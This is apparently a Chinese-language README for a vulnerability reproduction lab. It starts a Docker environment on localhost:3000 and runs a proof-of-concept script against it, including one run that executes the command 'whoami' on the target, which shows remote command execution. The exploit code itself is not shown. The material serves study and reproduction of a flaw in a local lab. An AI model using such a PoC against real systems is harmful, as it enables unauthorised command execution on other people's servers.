开启环境：
```
docker compose up -d
```
访问网页：
```
http://localhost:3000
```

使用poc脚本复现：
```
python3 poc.py --debug one4all -u http://localhost:3000
```

```
python3 poc.py --debug one4all -u http://localhost:3000 --command "whoami"
```

